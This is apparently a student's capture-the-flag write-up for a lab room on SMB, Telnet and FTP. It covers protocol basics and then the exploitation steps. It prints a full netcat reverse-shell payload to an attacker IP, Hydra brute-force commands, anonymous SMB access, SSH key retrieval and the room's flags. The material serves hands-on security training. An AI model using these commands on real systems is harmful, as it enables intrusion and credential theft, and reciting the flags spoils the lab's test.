@@ -1,0 +1,182 @@
+Network Services
+------------------
+
+With the above topix I can figure out that this room focused on the following network services:
+
+- SMB
+	- Understanding
+	- Enumerating
+	- Exploiting
+- Telnet
+	- Understanding
+	- Enumerating
+	- Exploiting
+- FTP
+	- Understanding
+	- Enumerating
+	- Exploiting
+
+Understanding SMB
+------------------
+
+SMB - Server Message Block Protocol
+
+- Client-Server Protocol
+- Sharing of files between devices including printers and other resources on network.
+
+This allows shared file systems to be accessed on the other devices via router.
+
+- Also, known as request-response protocol.
+
+- Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 
+
+How does SMB work?
+
+Once connection is established, the client can send commands (SMB commands) and open, read, write files on the system.
+
+- Windows runs SMB protocol(since Windows 95)
+
+- Samba, an open source server that supports the SMB protocol for UNIX systems
+
+Enumerating SMB
+-----------------
+
+- You know the basic definition of enumeration.
+
+SMB scope: Typically, smb allows us to read files on the remote system... So if we can get to access this protocol... We have access to it's data.
+
+Enumeration via NMAP:
+
+SMB client - 139
+
+SMB server - 445
+
+SSH running - 22
+
+Enum4linux: it is a pretty useful tool to enumerate smb shares on windows and linux systems.
+
+There is a list given in the room for enum4linux flags:
+
+-U             get userlist
+-M             get machine list
+-N             get namelist dump (different from -U and-M)
+-S             get sharelist
+-P             get password policy information
+-G             get group and member list
+
+-A             all of the above (full basic enumeration)
+
+Note: running just ```enum4linux <IP>``` will give a basic stats of all the things it could find on the target SMB enumeration.
+
+Exploitation
+--------------
+
+Exploitation was a challenge to solve... 
+
+IP: 10.10.164.4
+
+Enumerated the machine with nmap... 
+
+Ports: 
+
+139
+445
+22
+
+Used enum4linux to scan the smb ports...
+
+It was a very big output so look out for e4l_scan file.
+
+I then checked that anon login is allowed in smb.
+
+cmd: smbclient //10.10.164.4/profiles -u anonymous
+
+I downloaded a file called Working Home Directory Information.txt as information.txt
+
+cmd: get "Working Home Directory Information.txt" information.txt
+
+Meanwhile, I was doing all this found the enum4linux scan has enumerated some user cactus... Noted.
+
+The information.txt said something about logging into ssh... So I looked into the .ssh directory found the private key and downloaded it locally... 
+
+I logged with the user cactus@<IP> -i id_rsa_smb
+
+extracted smb.txt...
+
+Flag: THM{smb_is_fun_eh?}
+
+
+
+Understanding Telnet
+----------------------
+
+- User connects to the server via telnet and execute commands remotely on the server.
+
+- Telnet sends everything in plain text, and has no security measures... Therefore, in many places telnet is replaced by ssh.
+
+Command: telnet <IP> <port>
+
+- Telnet is a non encrypted channel.
+
+Exploiting Telnet
+-------------------
+
+IP: 10.10.241.113
+
+Full port scan was taking a while on the box... So I did what I had to do, i.e. see the writeup and saw there was a service running on port 8012. That'd be telnet (ofc). So I connected to the port via telnet <IP> 8012. and came up with a way to execute commands on the machine that is by .RUN preprocessor. 
+
+The problem was there was no output shown for any input on the server... Answer, reverse connection... So as room suggested I used msfvenom to create a reverse_netcat payload.
+
+Cmd: msfvenom -p cmd/unix/reverse_netcat lhost=10.2.26.221 lport=1234 R
+
+R -> specifies a raw string
+
+Payload: mkfifo /tmp/crsla; nc 10.2.26.221 1234 0</tmp/crsla | /bin/sh >/tmp/crsl 2>&1; rm /tmp/crsla
+
+and then copy pasting the string in the host machine...
+
+.RUN <payload> 
+
+gave me a reverse connection... and I cat out the flag.
+
+Flag: THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+
+Understanding FTP
+------------------
+
+A typical FTP session operates using two channels:
+	- Command/Control channel
+	- Data channel
+
+As implies... Command channel is generally for sending and responding to commands and the data channel is to transfer the data across the two hosts.
+
+Active and Passive FTP connections
+
+	- Active connection is where client opens a port and listens and the server is required to actively connect to it.
+	- Passive connection is where server opens a port and listens, where client comes and connect to it.
+
+- The separation of data channel with command channel is so that user, shouldn't be waiting for the data transfer to complete before sending further commands... And hence maintain the workflow...
+
+Exploiting FTP
+----------------
+
+If ftp's data and control channel are not encrypted, it can be vulnerable to MITM attack. An attacker can ARP Poison the network and can trick the victim to sent the sensitive information to him.
+
+Method Breakdown
+
+- We have a username 
+- We have a FTP server running on the server.
+
+This calls for HYDRA
+
+cmd: hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.43.110 ftp -vV
+
+Credentials:
+
+mike:password
+
+I logged in and get ftp.txt, and catted out the flag.
+
+Note: The future backup.rb file that I retrieved seems to be some sort of backdoor... I didn't got time to analyze more, but I guess that wasn't included in the room also... So let's just leave it there.
+This was it for the room... Peace.
